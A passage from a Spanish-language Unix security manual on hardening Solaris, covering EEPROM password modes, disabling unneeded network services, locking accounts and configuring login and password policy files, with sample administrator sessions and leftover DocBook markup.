m&#x00E1;quinas SPARC ofrecen tres niveles de seguridad: &#x2018;none-secure&#x2019;, &#x2018;command-secure&#x2019;, y &#x2018;full-secure&#x2019;.
El primero de ellos, &#x2018;none-secure&#x2019; es el que est&#x00E1; habilitado por defecto, y como su nombre
indica no ofrece ning&#x00FA;n tipo de seguridad: cualquiera que pulse &#x2018;Stop&#x2013;A&#x2019; desde la consola del
sistema <anchor 
   id="x1-134002f3"  ></anchor><footnote><para>     Si no se ha deshabilitado en /etc/system.</para></footnote>
obtiene un acceso total a la EEPROM sin necesidad de conocer ning&#x00FA;n tipo de contrase~na y puede reiniciar la
m&#x00E1;quina de la forma que le plazca.
<!--br/-->
<!--br/-->Los dos modos siguientes son los que ofrecen un nivel de seguridad algo superior; si activamos
&#x2018;command-secure&#x2019; ser&#x00E1; necesaria una clave para reiniciar el sistema de cualquier dispositivo que no sea el
utilizado por defecto (que generalmente ser&#x00E1; el disco, disk), y si elegimos &#x2018;full-secure&#x2019; la contrase~na es
obligatoria independientemente del dispositivo elegido para arrancar. En cualquier caso, esta clave es
diferente de la utilizada para acceder a Solaris como superusuario; si olvidamos la contrase~na de la
EEPROM pero tenemos acceso root a la m&#x00E1;quina podemos usar desde l&#x02CA;&#x0131;nea de &#x00F3;rdenes el comando &#x2018;eeprom&#x2019;
para modi&#xFB01;car (o consultar) cualquier par&#x00E1;metro de la NVRAM, passwords incluidos. Si hemos perdido la
contrase~na de la EEPROM y no podemos arrancar la m&#x00E1;quina, es muy posible que necesitemos sustituir
nuestra memoria NVRAM por una nueva, por lo que hemos de tener cuidado con las claves que
utilicemos para proteger la OBP; por supuesto, si utilizamos el modo &#x2018;full-secure&#x2019; podemos ir
olvid&#x00E1;ndonos de reinicios programados del sistema sin un operador que teclee el password en
consola: la seguridad en muchas ocasiones no es del todo compatible con la comodidad o la
funcionalidad.
<!--br/-->
<!--br/-->Como hemos adelantado, para consultar o modi&#xFB01;car el modo en el que se encuentra nuestra memoria
NVRAM podemos ejecutar la orden &#x2018;eeprom&#x2019;; en nuestro caso queremos conocer el estado
de la variable &#x2018;security-mode&#x2019;, por lo que desde una l&#x02CA;&#x0131;nea de comandos teclear&#x02CA;&#x0131;amos lo
siguiente:

     </para><literallayout role="verbatim">
&#x00A0;marta:/#&#x00A0;eeprom&#x00A0;security-mode
&#x00A0;security-mode=none
&#x00A0;marta:/#
</literallayout>
<!--l. 125--><para>Podemos ver que en este caso nuestra m&#x00E1;quina no tiene habilitado ning&#x00FA;n tipo de seguridad; si quisi&#x00E9;ramos
habilitar el modo &#x2018;command-secure&#x2019;, ejecutar&#x02CA;&#x0131;amos:

     </para><literallayout role="verbatim">
&#x00A0;marta:/#&#x00A0;eeprom&#x00A0;security-mode
&#x00A0;security-mode=none
&#x00A0;marta:/#&#x00A0;eeprom&#x00A0;security-mode=command
&#x00A0;Changing&#x00A0;PROM&#x00A0;password:
&#x00A0;New&#x00A0;password:
&#x00A0;Retype&#x00A0;new&#x00A0;password:
&#x00A0;marta:/#&#x00A0;eeprom&#x00A0;security-mode
&#x00A0;security-mode=command
&#x00A0;marta:/#
</literallayout>
<!--l. 141--><para>Tambi&#x00E9;n es posible realizar estos cambios desde el propio prompt de la memoria NVRAM, mediante la orden
&#x2018;setenv&#x2019; <anchor 
   id="x1-134003f4"  ></anchor><footnote><para>   Esta orden corresponde a la OpenBoot PROM; no hay que confundirla con el comando del mismo nombre que poseen
algunos shells.</para></footnote>:

     </para><literallayout role="verbatim">
&#x00A0;ok&#x00A0;setenv&#x00A0;security-mode&#x00A0;command
&#x00A0;security-mode&#x00A0;=&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;command
&#x00A0;ok
</literallayout>
<!--l. 152--><para>A partir de este momento, cuando el sistema inicie desde un dispositivo que no sea el utilizado por defecto,
se solicitar&#x00E1; la clave que acabamos de teclear; de forma similar podr&#x02CA;&#x0131;amos habilitar el modo
&#x2018;full-secure&#x2019;. Para eliminar cualquier clave de nuestra memoria no tenemos m&#x00E1;s que restaurar el modo
&#x2018;none-secure&#x2019;, de la forma habitual:

     </para><literallayout role="verbatim">
&#x00A0;marta:/#&#x00A0;eeprom&#x00A0;security-mode=none
&#x00A0;marta:/#&#x00A0;eeprom&#x00A0;security-mode
&#x00A0;security-mode=none
&#x00A0;marta:/#
</literallayout>
<!--l. 165--><para>Si en los modos &#x2018;command-secure&#x2019; o &#x2018;full-secure&#x2019; queremos cambiar la contrase~na de la NVRAM
podemos utilizar de nuevo la orden &#x2018;eeprom&#x2019;, esta vez con el par&#x00E1;metro &#x2018;security-password&#x2019;:

     </para><literallayout role="verbatim">
&#x00A0;marta:/#&#x00A0;eeprom&#x00A0;security-password=
&#x00A0;Changing&#x00A0;PROM&#x00A0;password:
&#x00A0;New&#x00A0;password:
&#x00A0;Retype&#x00A0;new&#x00A0;password:
&#x00A0;marta:/#&#x00A0;eeprom&#x00A0;security-password
&#x00A0;security-password=&#x00A0;data&#x00A0;not&#x00A0;available.
&#x00A0;marta:/#
</literallayout>
<!--l. 179--><para>Como podemos ver, al consultar el valor de la variable, este nunca se muestra en pantalla.
<!--br/-->
<!--br/-->El tercer y &#x00FA;ltimo par&#x00E1;metro relacionado con la seguridad de la memoria EEPROM es
<!--br/-->&#x2018;security-#badlogins&#x2019;, que no es m&#x00E1;s que un contador que indica el n&#x00FA;mero de contrase~nas
incorrectas que el sistema ha recibido; podemos resetear su valor sencillamente asign&#x00E1;ndole
&#x2018;0&#x2019; <anchor 
   id="x1-134004f5"  ></anchor><footnote><para>     En ciertas versiones de SunOS &#x2013; no Solaris &#x2013; tambi&#x00E9;n se pod&#x02CA;&#x0131;a resetear este contador pas&#x00E1;ndole como par&#x00E1;metro
&#x2018;reset&#x2019;.</para></footnote>:

     </para><literallayout role="verbatim">
&#x00A0;marta:/#&#x00A0;eeprom&#x00A0;security-#badlogins
&#x00A0;security-#badlogins=4
&#x00A0;marta:/#&#x00A0;eeprom&#x00A0;security-#badlogins=0
&#x00A0;marta:/#&#x00A0;eeprom&#x00A0;security-#badlogins
&#x00A0;security-#badlogins=0
&#x00A0;marta:/#
</literallayout>
<!--l. 197--><para>Antes de &#xFB01;nalizar este punto quiz&#x00E1;s sea necesario recordar que los par&#x00E1;metros de seguridad de la memoria
EEPROM que acabamos de ver s&#x00F3;lo existen en m&#x00E1;quinas SPARC; aunque en la versi&#x00F3;n de Solaris para
arquitecturas Intel tambi&#x00E9;n existe una orden denominada &#x2018;eeprom&#x2019; que nos mostrar&#x00E1; los valores de ciertos
par&#x00E1;metros si la ejecutamos, &#x00FA;nicamente se trata de una simulaci&#x00F3;n llevada a cabo en un &#xFB01;chero de texto
denominado &#x2018;bootenv.rc&#x2019;. Es posible dar valor a las variables que hemos visto, pero no tienen ning&#x00FA;n
efecto en m&#x00E1;quinas Intel ya que estas se suelen proteger en el arranque mediante contrase~nas en la BIOS,
como veremos al hablar de Linux.
  </para></section><!--end section--><!--l. 207--><section 
role="section"><title><abbrev role="title-mark">9.3</abbrev><anchor 
   id="x1-1350009.3"  ></anchor>Servicios de red</title>
<!--l. 208--><para>  Probablemente el primer aspecto relacionado con la seguridad al que debemos prestar atenci&#x00F3;n en un
sistema Solaris es a los servicios ofrecidos desde inetd; con la instalaci&#x00F3;n out of the box el n&#x00FA;mero de
puertos a la escucha es realmente elevado, y muchos de ellos son servidos desde inetd (despu&#x00E9;s
hablaremos de los servicios que se inician al arrancar el sistema). Aparte de los servicios cl&#x00E1;sicos
(telnet, finger&#x2026;) que &#x2013; como en el resto de Unices &#x2013; es imprescindible deshabilitar, en Solaris
encontramos algunas entradas de /etc/inetd.conf algo m&#x00E1;s extra~nas, que en muchos casos no
sabemos si podemos eliminar (o comentar) si que ello afecte al funcionamiento de la m&#x00E1;quina: se
trata de ciertos servicios basados en RPC, como cmsd o sprayd. En casi todos los servidores
podemos deshabilitar estos servicios sin mayores problemas, pero evidentemente tomando ciertas
precauciones: es necesario conocer cu&#x00E1;l es la funci&#x00F3;n y las implicaciones de seguridad de cada uno de
ellos; en <citation>[?]</citation> (especialmente en la segunda parte del art&#x02CA;&#x0131;culo) se puede encontrar una referencia
r&#x00E1;pida de la funci&#x00F3;n de algunos de estos servicios &#x2018;extra~nos&#x2019;, as&#x02CA;&#x0131; como notas con respecto a su
seguridad.
<!--br/-->
<!--br/-->Realmente, de todos los servicios ofrecidos por inetd ninguno es estrictamente necesario, aunque por
supuesto alguno de ellos nos puede resultar muy &#x00FA;til: lo normal es que al menos telnet y ftp se dejen
abiertos para efectuar administraci&#x00F3;n remota. No obstante, algo muy recomendable es sustituir ambos por
SSH, que permite tanto la terminal remota como la transferencia de archivos de forma cifrada; si nos
limitamos a este servicio y lo ofrecemos desde inetd, esta ser&#x00E1; la &#x00FA;nica entrada no comentada en
/etc/inetd.conf:

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;grep&#x00A0;-v&#x00A0;&#x02C6;&#x005C;#&#x00A0;/etc/inetd.conf
&#x00A0;ssh&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;stream&#x00A0;&#x00A0;tcp&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;nowait&#x00A0;&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;/usr/local/sbin/sshd&#x00A0;&#x00A0;&#x00A0;&#x00A0;sshd&#x00A0;-i
&#x00A0;anita:/#
</literallayout>
<!--l. 241--><para>Otros de los servicios que Solaris ofrece tras su instalaci&#x00F3;n son servidos por demonios independientes que se
lanzan en el arranque del sistema desde scripts situados en /etc/init.d/ y enlazados desde /etc/rc2.d/
y /etc/rc3.d/; al igual que suced&#x02CA;&#x0131;a con los servidos desde inetd, muchos de estos servicios no son
necesarios para un correcto funcionamiento del sistema, y algunos de ellos hist&#x00F3;ricamente han
presentado &#x2013; y siguen presentando &#x2013; graves problemas de seguridad. No vamos a entrar aqu&#x02CA;&#x0131; en
cu&#x00E1;les de estos servicios son necesarios y cu&#x00E1;les no, ya que eso depende por completo del tipo de
sistema sobre el que estemos trabajando; es necesario conocer las implicaciones de seguridad que
algunos de los demonios lanzados en el arranque presentan, y para ello una buena introducci&#x00F3;n es
<citation>[?]</citation>.
<!--br/-->
<!--br/-->Al arrancar una m&#x00E1;quina Solaris, por defecto el proceso init situa al sistema en su runlevel 3, lo cual
implica que &#x2013; entre otras acciones &#x2013; se invoca a /sbin/rc2 y /sbin/rc3; estos dos shellscripts
se encargan de recorrer los directorios /etc/rc2.d/ y /etc/rc3.d/, ejecutando cualquier
&#xFB01;chero cuyo nombre comience por &#x2018;S&#x2019;. De esta forma, para evitar que un determinado script se
ejecute autom&#x00E1;ticamente al arrancar una m&#x00E1;quina lo m&#x00E1;s recomendable es ir directamente a
/etc/rc2.d/ o /etc/rc3.d/ y sustituir la &#x2018;S&#x2019; inicial de su nombre por otro car&#x00E1;cter; esta pr&#x00E1;ctica
suele ser m&#x00E1;s habitual que eliminar el &#xFB01;chero directamente, ya que as&#x02CA;&#x0131; conseguimos que si es
necesario lanzar de nuevo el script al arrancar Solaris no tengamos m&#x00E1;s que cambiarle de nuevo el
nombre. Por ejemplo, si queremos que el demonio sendmail no se lance en el arranque, no
tenemos m&#x00E1;s que ir al directorio correspondiente y renombrar el script que lo invoca; aparte de
eso, es probable que nos interese detenerlo en ese momento, sin esperar al pr&#x00F3;ximo reinicio del
sistema:

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;cd&#x00A0;/etc/rc2.d/
&#x00A0;anita:/etc/rc2.d#&#x00A0;mv&#x00A0;S88sendmail&#x00A0;disabled.S88sendmail
&#x00A0;anita:/etc/rc2.d#&#x00A0;./disabled.S88sendmail&#x00A0;stop
&#x00A0;anita:/etc/rc2.d#
</literallayout>
<!--l. 277--><para>Podemos ver que para detener el demonio hemos invocado al mismo &#xFB01;chero que lo arranca, pero pas&#x00E1;ndole
como par&#x00E1;metro &#x2018;stop&#x2019;; si quisi&#x00E9;ramos relanzar sendmail, no tendr&#x02CA;&#x0131;amos m&#x00E1;s que volver a ejecutar el script
pero pas&#x00E1;ndole como argumento &#x2018;start&#x2019;.
  </para></section><!--end section--><!--l. 281--><section 
role="section"><title><abbrev role="title-mark">9.4</abbrev><anchor 
   id="x1-1360009.4"  ></anchor>Usuarios y accesos al sistema</title>
<!--l. 282--><para>  Durante la instalaci&#x00F3;n de Solaris se crean en /etc/passwd una serie de entradas correspondientes a
usuarios considerados &#x2018;del sistema&#x2019; (adm, bin, nobody&#x2026;); ninguno de estos usuarios tiene por qu&#x00E9; acceder a
la m&#x00E1;quina, de forma que una buena pol&#x02CA;&#x0131;tica es bloquear sus cuentas. Podemos comprobar qu&#x00E9; usuarios
tienen el acceso bloqueado consultando el estado de su contrase~na: si es &#x2018;LK&#x2019; (locked), la cuenta est&#x00E1;
bloqueada:

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;passwd&#x00A0;-s&#x00A0;-a|grep&#x00A0;LK
&#x00A0;daemon&#x00A0;&#x00A0;LK
&#x00A0;bin&#x00A0;&#x00A0;LK
&#x00A0;sys&#x00A0;&#x00A0;LK
&#x00A0;adm&#x00A0;&#x00A0;LK
&#x00A0;lp&#x00A0;&#x00A0;LK
&#x00A0;uucp&#x00A0;&#x00A0;LK
&#x00A0;nuucp&#x00A0;&#x00A0;LK
&#x00A0;listen&#x00A0;&#x00A0;LK
&#x00A0;nobody&#x00A0;&#x00A0;LK
&#x00A0;noaccess&#x00A0;&#x00A0;LK
&#x00A0;nobody4&#x00A0;&#x00A0;LK
&#x00A0;anita:/#
</literallayout>
<!--l. 306--><para>Podemos bloquear una cuenta de acceso a la m&#x00E1;quina mediante &#x2018;passwd -l&#x2019;, de la forma siguiente:

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;passwd&#x00A0;-s&#x00A0;&#x00A0;toni
&#x00A0;toni&#x00A0;&#x00A0;PS&#x00A0;&#x00A0;&#x00A0;&#x00A0;06/15/01&#x00A0;&#x00A0;&#x00A0;&#x00A0;7&#x00A0;&#x00A0;7
&#x00A0;anita:/#&#x00A0;passwd&#x00A0;-l&#x00A0;toni
&#x00A0;anita:/#&#x00A0;passwd&#x00A0;-s&#x00A0;&#x00A0;toni
&#x00A0;toni&#x00A0;&#x00A0;LK&#x00A0;&#x00A0;&#x00A0;&#x00A0;06/27/01&#x00A0;&#x00A0;&#x00A0;&#x00A0;7&#x00A0;&#x00A0;7
&#x00A0;anita:/#
</literallayout>
<!--l. 318--><para>A pesar de su estado, las cuentas bloqueadas son accesibles si ejecutamos la orden
&#x2018;su&#x2019; como administradores, por lo que si estamos bastante preocupados por nuestra
seguridad podemos asignarles un shell que no permita la ejecuci&#x00F3;n de &#x00F3;rdenes, como
/bin/false <anchor 
   id="x1-136001f6"  ></anchor><footnote><para>   Por supuesto, teniendo en cuenta que si alguien es root no va a tener problemas para convertirse en otro usuario, sin
importar el shell que este &#x00FA;ltimo tenga.</para></footnote>:

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;su&#x00A0;-&#x00A0;adm
&#x00A0;$&#x00A0;id
&#x00A0;uid=4(adm)&#x00A0;gid=4(adm)
&#x00A0;$&#x00A0;&#x02C6;d
&#x00A0;anita:/#&#x00A0;passwd&#x00A0;-e&#x00A0;adm
&#x00A0;Old&#x00A0;shell:&#x00A0;/bin/sh
&#x00A0;New&#x00A0;shell:&#x00A0;/bin/false
&#x00A0;anita:/#&#x00A0;su&#x00A0;-&#x00A0;adm
&#x00A0;anita:/#&#x00A0;id
&#x00A0;uid=0(root)&#x00A0;gid=1(other)
&#x00A0;anita:/#
</literallayout>
<!--l. 340--><para>Si realmente somos paranoicos, de la lista de usuarios que hemos visto antes incluso nos podemos permitir
el lujo de eliminar a nobody4, ya que se trata de una entrada que existe para proporcionar
cierta compatibilidad entre Solaris y SunOS que actualmente apenas se usa. No obstante,
much&#x02CA;&#x0131;simo m&#x00E1;s importante que esto es eliminar o bloquear a cualquier usuario sin contrase~na en el
sistema; es recomendable comprobar de forma peri&#x00F3;dica que estos usuarios no existen, para lo
cual tambi&#x00E9;n podemos utilizar &#x2018;passwd -s -a&#x2019; y vigilar las claves cuyo estado sea &#x2018;NP&#x2019; (No
Password):

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;passwd&#x00A0;-s&#x00A0;-a|grep&#x00A0;NP
&#x00A0;prueba&#x00A0;&#x00A0;NP
&#x00A0;anita:/#&#x00A0;passwd&#x00A0;-l&#x00A0;prueba
&#x00A0;anita:/#
</literallayout>
<!--l. 357--><para>Tras estas medidas de seguridad iniciales, lo m&#x00E1;s probable es que en nuestro sistema comencemos a dar de
alta usuarios reales; sin duda, lo primero que estos usuarios tratar&#x00E1;n de hacer es conectar remotamente v&#x02CA;&#x0131;a
telnet:

     </para><literallayout role="verbatim">
&#x00A0;rosita:~$&#x00A0;telnet&#x00A0;anita
&#x00A0;Trying&#x00A0;192.168.0.3...
&#x00A0;Connected&#x00A0;to&#x00A0;anita.
&#x00A0;Escape&#x00A0;character&#x00A0;is&#x00A0;&#x2019;&#x02C6;]&#x2019;.
&#x00A0;
&#x00A0;
&#x00A0;SunOS&#x00A0;5.8
&#x00A0;
&#x00A0;login:&#x00A0;toni
&#x00A0;Password:
&#x00A0;Last&#x00A0;login:&#x00A0;Fri&#x00A0;Jun&#x00A0;22&#x00A0;10:45:14&#x00A0;from&#x00A0;luisa
&#x00A0;anita:~$
</literallayout>
<!--l. 377--><para>A estas alturas ya debemos saber que es una locura utilizar telnet para nuestras conexiones remotas por el
peligro que implica el tr&#x00E1;&#xFB01;co de contrase~nas en texto claro, por lo que debemos obligatoriamente utilizar
SSH o similar. Si de cualquier forma no tenemos m&#x00E1;s remedio que permitir telnet (no encuentro ning&#x00FA;n
motivo para ello, y personalmente dudo que los haya&#x2026;), quiz&#x00E1;s nos interese modi&#xFB01;car el banner de
bienvenida al sistema, donde se muestra claramente que la m&#x00E1;quina tiene instalada una versi&#x00F3;n concreta de
Solaris: esto es algo que puede ayudar a un pirata que busque informaci&#x00F3;n de nuestro sistema. Para cambiar
el mensaje podemos crear el archivo /etc/default/telnetd, en el que la entrada &#x2018;BANNER&#x2019; especi&#xFB01;ca
dicho mensaje:

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;cat&#x00A0;/etc/default/telnetd
&#x00A0;BANNER=&#x0022;&#x005C;nHP-UX&#x00A0;anita&#x00A0;A.09.05&#x00A0;E&#x00A0;9000/735&#x00A0;(ttyv4)&#x005C;n&#x005C;n&#x0022;
&#x00A0;anita:/#&#x00A0;telnet&#x00A0;0
&#x00A0;Trying&#x00A0;0.0.0.0...
&#x00A0;Connected&#x00A0;to&#x00A0;0.
&#x00A0;Escape&#x00A0;character&#x00A0;is&#x00A0;&#x2019;&#x02C6;]&#x2019;.
&#x00A0;
&#x00A0;HP-UX&#x00A0;anita&#x00A0;A.09.05&#x00A0;E&#x00A0;9000/735&#x00A0;(ttyv4)
&#x00A0;
&#x00A0;login:
&#x00A0;
</literallayout>
<!--l. 403--><para>Algo similar se puede hacer con el &#xFB01;chero /etc/default/ftpd para el servicio de FTP, aunque de nuevo
dudo que haya alg&#x00FA;n motivo para mantenerlo abierto; estos mensajes evidentemente no van a evitar que
alguien pueda obtener datos sobre el sistema operativo que se ejecuta en una m&#x00E1;quina (veremos al hablar
del sistema de red en Solaris como conseguir esto), pero al menos no le dejar&#x00E1;n esa informaci&#x00F3;n en
bandeja.
<!--br/-->
<!--br/-->Siguiendo con las conexiones remotas a un sistema, uno de los aspectos que nos puede llamar
la atenci&#x00F3;n si estamos comenzando a trabajar con Solaris es que el usuario root s&#x00F3;lo puede
conectar desde la propia consola de la m&#x00E1;quina; si lo intenta de forma remota, se le negar&#x00E1; el
acceso:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~$&#x00A0;telnet&#x00A0;anita
&#x00A0;Trying&#x00A0;192.168.0.3...
&#x00A0;Connected&#x00A0;to&#x00A0;anita.
&#x00A0;Escape&#x00A0;character&#x00A0;is&#x00A0;&#x2019;&#x02C6;]&#x2019;.
&#x00A0;
&#x00A0;login:&#x00A0;root
&#x00A0;Password:
&#x00A0;Not&#x00A0;on&#x00A0;system&#x00A0;console
&#x00A0;Connection&#x00A0;closed&#x00A0;by&#x00A0;foreign&#x00A0;host.
&#x00A0;luisa:~$
</literallayout>
<!--l. 427--><para>Esto es debido a que el par&#x00E1;metro &#x2018;CONSOLE&#x2019; tiene como valor dicha consola (/dev/console) en el &#xFB01;chero
/etc/default/login; para trabajar como superusuario de forma remota es necesario acceder
al sistema como un usuario sin privilegios y despu&#x00E9;s ejecutar el comando su. Esta forma de
trabajo suele ser la m&#x00E1;s recomendable, ya que ofrece un equilibrio aceptable entre seguridad y
funcionalidad; no obstante, si nos interesara que root pudiera conectar directamente de forma
remota (no suele ser recomendable), podr&#x02CA;&#x0131;amos comentar la entrada &#x2018;CONSOLE&#x2019; en el &#xFB01;chero
anterior, mediante una almohadilla (&#x2018;#&#x2019;). Si por el contrario queremos que el administrador no
pueda conectar al sistema ni desde la propia consola, y s&#x00F3;lo se puedan alcanzar privilegios de
superusuario mediante la ejecuci&#x00F3;n de su, podemos dejar la entrada correspondiente a &#x2018;CONSOLE&#x2019; en
blanco:

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;grep&#x00A0;-i&#x00A0;console&#x00A0;/etc/default/login
&#x00A0;#&#x00A0;If&#x00A0;CONSOLE&#x00A0;is&#x00A0;set,&#x00A0;root&#x00A0;can&#x00A0;only&#x00A0;login&#x00A0;on&#x00A0;that&#x00A0;device.
&#x00A0;CONSOLE=
&#x00A0;anita:/#
</literallayout>
<!--l. 449--><para>En el &#xFB01;chero anterior (/etc/default/login) existen otros par&#x00E1;metros interesantes de cara a incrementar
nuestra seguridad. Por ejemplo, el par&#x00E1;metro &#x2018;TIMEOUT&#x2019; indica el n&#x00FA;mero de segundos (entre 0 y 900) que
han de pasar desde que la m&#x00E1;quina solicita el login al conectar remotamente hasta que se cierra la
conexi&#x00F3;n si el usuario no lo teclea; esto nos puede ayudar a evitar ciertos ataques de negaci&#x00F3;n de
servicio, pero puede ser un problema si tenemos usuarios que conecten a trav&#x00E9;s de l&#x02CA;&#x0131;neas de
comunicaci&#x00F3;n lentas o muy saturadas, ya que con un timeout excesivamente bajo es posible que
antes de que el usuario vea en su terminal el banner que le solicita su login la conexi&#x00F3;n llegue a
cerrarse.
<!--br/-->
<!--br/-->Relacionada en cierta forma con el par&#x00E1;metro anterior, y tambi&#x00E9;n dentro del archivo
<!--br/-->/etc/default/login, la entrada &#x2018;SLEEPTIME&#x2019; permite indicar el n&#x00FA;mero de segundos &#x2013; entre 0 y 5 &#x2013; que
han de transcurrir desde que se teclea una contrase~na err&#x00F3;nea y el mensaje login incorrect aparece en
pantalla. Con &#x2018;RETRIES&#x2019; podemos especi&#xFB01;car el n&#x00FA;mero de intentos de entrada al sistema que se pueden
producir hasta que un proceso de login &#xFB01;nalice y la conexi&#x00F3;n remota asociada se cierre: en otras palabras,
indicamos el n&#x00FA;mero de veces que un usuario puede equivocarse al teclear su clave antes de que el sistema
cierre su conexi&#x00F3;n.
<!--br/-->
<!--br/-->Otra directiva interesante de /etc/default/login es &#x2018;PASSREQ&#x2019;: si su valor es &#x2018;YES&#x2019;, ning&#x00FA;n usuario podr&#x00E1;
conectar al sistema sin contrase~na, y si es &#x2018;NO&#x2019;, s&#x02CA;&#x0131; que se permiten este tipo de entradas. Evidentemente, el
valor recomendable es el primero, aunque el incremento que conseguimos en nuestra seguridad no es
excesivo y s&#x00F3;lo se puede encontrar &#x00FA;til en circunstancias muy concretas, ya que a los usuarios que
no tengan contrase~na simplemente se les obligar&#x00E1; a elegir un password al intentar entrar al
sistema:

     </para><literallayout role="verbatim">
&#x00A0;anita:~$&#x00A0;telnet&#x00A0;0
&#x00A0;Trying&#x00A0;0.0.0.0...
&#x00A0;Connected&#x00A0;to&#x00A0;0.
&#x00A0;Escape&#x00A0;character&#x00A0;is&#x00A0;&#x2019;&#x02C6;]&#x2019;.
&#x00A0;
&#x00A0;login:&#x00A0;prueba
&#x00A0;Choose&#x00A0;a&#x00A0;new&#x00A0;password.
&#x00A0;New&#x00A0;password:
</literallayout>
<!--l. 489--><para>Si realmente queremos asegurarnos de que no tenemos usuarios sin clave podemos ejecutar peri&#x00F3;dicamente la
orden &#x2018;logins -p&#x2019;, que nos mostrar&#x00E1; los informaci&#x00F3;n acerca de los usuarios sin contrase~na en la m&#x00E1;quina; si
su salida es no vac&#x02CA;&#x0131;a, tenemos un grave problema de seguridad:

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;logins&#x00A0;-p
&#x00A0;prueba&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;107&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;staff&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;10&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Usuari&#x00A0;en&#x00A0;proves
&#x00A0;anita:/#&#x00A0;passwd&#x00A0;prueba
&#x00A0;New&#x00A0;password:
&#x00A0;Re-enter&#x00A0;new&#x00A0;password:
&#x00A0;passwd&#x00A0;(SYSTEM):&#x00A0;passwd&#x00A0;successfully&#x00A0;changed&#x00A0;for&#x00A0;prueba
&#x00A0;anita:/#&#x00A0;logins&#x00A0;-p
&#x00A0;anita:/#
</literallayout>
<!--l. 506--><para>Para &#xFB01;nalizar con /etc/default/login, vamos a hablar de un par de entradas en el &#xFB01;chero relacionadas con
la auditor&#x02CA;&#x0131;a de los accesos al sistema: el par&#x00E1;metro &#x2018;SYSLOG&#x2019; con un valor &#x2018;YES&#x2019; determina si se han de
registrar mediante syslog los accesos al sistema como root, as&#x02CA;&#x0131; como los intentos de login fallidos, y
el par&#x00E1;metro &#x2018;SYSLOG<informalequation><graphic 
fileref="unixsec86x.gif"></graphic></informalequation>FAILED<informalequation><graphic 
fileref="unixsec87x.gif"></graphic></informalequation>LOGINS&#x2019; indica el n&#x00FA;mero de intentos de entrada fallidos que
se han de producir antes de emitir un mensaje de error; es recomendable que esta segunda
variable tenga un valor &#x2018;0&#x2019;, que implica que syslog registrar&#x00E1; todos los intentos fallidos de
login:

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;grep&#x00A0;-i&#x00A0;&#x02C6;syslog&#x00A0;/etc/default/login
&#x00A0;SYSLOG=YES
&#x00A0;SYSLOG&#x005F;FAILED&#x005F;LOGINS=0
&#x00A0;anita:/#
</literallayout>
<!--l. 523--><para>Otro archivo interesante de cara a incrementar aspectos de la seguridad relacionados con los usuarios de
nuestro sistema es /etc/default/passwd, donde se pueden de&#xFB01;nir par&#x00E1;metros para reforzar nuestra
pol&#x02CA;&#x0131;tica de contrase~nas; por ejemplo, podemos de&#xFB01;nir una longitud m&#x02CA;&#x0131;nima para los passwords de los
usuarios d&#x00E1;ndole un valor a la variable &#x2018;PASSLENGTH&#x2019;:

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;grep&#x00A0;-i&#x00A0;passlength&#x00A0;/etc/default/passwd
&#x00A0;PASSLENGTH=8
&#x00A0;anita:/#
</literallayout>
<!--l. 536--><para>Por defecto, la longitud m&#x02CA;&#x0131;nima de una clave es de seis caracteres; si le asignamos a &#x2018;PASSLENGTH&#x2019; un valor
menor (algo poco recomendable de cualquier forma), el sistema simplemente lo ignorar&#x00E1; y obligar&#x00E1; a los
usuarios a utilizar passwords de seis o m&#x00E1;s caracteres. Adem&#x00E1;s, sea cual sea la longitud de las
claves que de&#xFB01;namos, debemos tener siempre en cuenta que Solaris s&#x00F3;lo interpetar&#x00E1; los ocho
primeros caracteres de cada contrase~na; el resto son ignorados, por lo que dos passwords
cuyos ocho primeros caracteres sean iguales ser&#x00E1;n equivalentes por completo para el modelo de
autenticaci&#x00F3;n.
<!--br/-->
<!--br/-->Una contrase~na en Solaris debe poseer al menos dos letras (may&#x00FA;sculas o min&#x00FA;sculas) y al menos un n&#x00FA;mero o
car&#x00E1;cter especial. Tampoco debe coincidir con el nombre de usuario, ni con rotaciones del mismo (por
ejemplo el usuario &#x2018;antonio&#x2019; no podr&#x00E1; utilizar como clave &#x2018;antonio&#x2019;, &#x2018;ntonioa&#x2019;, &#x2018;oinotna&#x2019;, etc.), y
debe diferir del password anterior en al menos tres caracteres; para cualquiera de estos efectos
comparativos, las letras may&#x00FA;sculas y las min&#x00FA;sculas son equivalentes. S&#x00F3;lo el root puede adjudicar
contrase~nas que no cumplan las normas establecidas, pero a efectos de seguridad es recomendable que
las claves que asigne tengan tantas restricciones como las que pueden escojer los usuarios (o
m&#x00E1;s).
<!--br/-->
<!--br/-->Volviendo de nuevo a /etc/default/passwd, dentro de este archivo tenemos un par de entradas &#x00FA;tiles para
establecer una pol&#x02CA;&#x0131;tica de envejecimiento de claves en nuestro sistema; se trata de &#x2018;MAXWEEKS&#x2019; y
&#x2018;MINWEEKS&#x2019;, que como sus nombres indican de&#xFB01;nen los tiempos de vida m&#x00E1;ximo y m&#x02CA;&#x0131;nimo (en semanas) de
una contrase~na. Un tercer par&#x00E1;metro, &#x2018;WARNWEEKS&#x2019;, de&#xFB01;ne el periodo de tiempo (de nuevo, en semanas) a
partir del cual se avisar&#x00E1; a un usuario de que su password est&#x00E1; a punto de caducar; dicho aviso se produce
